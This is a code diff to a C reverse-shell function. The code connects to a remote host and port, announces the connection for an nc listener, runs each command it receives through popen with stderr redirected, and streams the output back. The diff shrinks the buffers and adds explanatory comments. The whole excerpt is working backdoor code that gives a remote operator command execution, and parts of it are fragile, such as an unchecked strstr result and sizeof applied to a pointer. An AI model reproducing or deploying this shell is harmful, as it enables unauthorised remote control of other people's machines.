@@ -12,8 +12,8 @@ const char *PROC_NET_TCP = "/proc/net/tcp";
 
 void reverse_shell(const char *host, unsigned int port, unsigned int num_shells) {
     int sock;
-    char input[4096];
-    char output[4096];
+    char input[256];
+    char output[256];
     struct sockaddr_in client;
     const char *cmd_postfix = " 2>&1";
 
@@ -41,14 +41,18 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
             }
         }
 
+        // Send a message to indicate a socket just connected.
+        // Helpful when using a simple `nc` listener
         send(sock, "Connected!\n", strlen("Connected!\n"), 0);
 
         while (read(sock, input, sizeof(input) - sizeof(cmd_postfix) - 1) > 0) {
+            // Add a postfix to the command to redirect stderr to stdout, s.t.
+            // it is also picked up by fgets
             char *enter = strstr(input, "\n");
             strcpy(enter, cmd_postfix);
             FILE *fp = popen(input, "r");
             while (fgets(output, sizeof(output), fp) != NULL) {
-                send(sock, output, strlen(output), 0);
+                send(sock, output, strlen(output)+1, 0);
             }
             pclose(fp);
         }
